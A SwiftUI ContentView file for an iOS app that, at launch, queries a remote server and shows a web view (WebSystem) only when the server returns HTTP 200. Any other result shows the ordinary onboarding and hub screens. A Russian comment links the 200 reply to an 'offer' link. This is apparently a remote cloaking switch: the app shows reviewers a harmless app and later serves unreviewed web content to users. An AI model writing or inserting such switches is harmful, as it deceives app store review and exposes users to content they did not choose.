//
//  ContentView.swift
//  DF718
//
//  Created by IGOR on 13/10/2025.
//

import SwiftUI
import Foundation

struct ContentView: View {
    @StateObject private var userProgress = UserProgress()
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                ProgressView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    AppColors.background
                        .ignoresSafeArea()
                    
                    if userProgress.hasCompletedOnboarding {
                        MainHubView(userProgress: userProgress)
                    } else {
                        OnboardingView(userProgress: userProgress)
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            makeServerRequest()
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        print("Making request to: \(url.absoluteString)")
        print("Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Принудительно добавляем Host заголовок для правильного SNI
        URLSession.shared.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing block")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("HTTP Status Code: \(httpResponse.statusCode)")
                    
                    if httpResponse.statusCode == 200 {
                        // Только 200 разблокирует (есть ссылка на оффер)
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // Все остальные коды (404, 500, и т.д.) - блокируем
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}


#Preview {
    ContentView()
}
